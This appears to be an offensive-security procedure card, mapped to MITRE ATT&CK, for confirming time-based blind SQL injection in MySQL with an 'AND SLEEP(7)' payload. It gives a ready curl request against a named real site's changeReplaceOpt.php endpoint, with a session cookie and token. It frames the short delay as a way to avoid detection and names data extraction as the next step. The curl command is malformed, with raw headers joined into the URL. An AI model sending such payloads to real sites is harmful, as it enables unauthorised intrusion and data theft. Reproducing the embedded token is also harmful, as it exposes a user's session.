---
id: proc-sqli-confirm-sleep7-001
tags:
  - sqli
  - time-based
  - sleep
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/sqli-sleep-7-change-replace-opt]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:04.959Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm Time-Based SQLi with SLEEP(7)

## Summary

This procedure provides secondary confirmation of the time-based blind SQL injection using a 7-second SLEEP payload, ensuring reliability of the vulnerability detection.

## Description

Building on initial tests, a shorter sleep duration reduces testing time while still demonstrating query injection. This is useful for avoiding detection in rate-limited environments and confirms consistent behavior in the MySQL query execution path.

## Requirements

1. Confirmed baseline from previous steps
2. HTTP request tool with timing
3. Target endpoint

## Defense

Defensive measures and detection strategies:

- Escape special characters in inputs
- Implement query whitelisting
- Use intrusion detection for delay patterns

## Objectives

1. Induce 7-second delay
2. Cross-verify with longer sleep test
3. Proceed to data extraction

## Instructions

### Step 1: Inject Shorter Sleep Payload

**Context**: Use 'AND SLEEP(7)' to test with less wait time.

**Command** ([[commands/sqli-sleep-7-change-replace-opt]]):
```bash
curl -X GET "/changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(7)" HTTP/1.1\nHost: www.intensedebate.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0\nAccept: */*\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: https://www.intensedebate.com/install-t\nCookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

> Expect ~7-second response; validates consistency.

### Step 2: Analyze Results

**Context**: Ensure delay matches expected duration.

> Timing comparison; no command needed.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqli-sleep-7-change-replace-opt]]

## Tools Used


## Tags

- sqli
- sleep
- confirmation
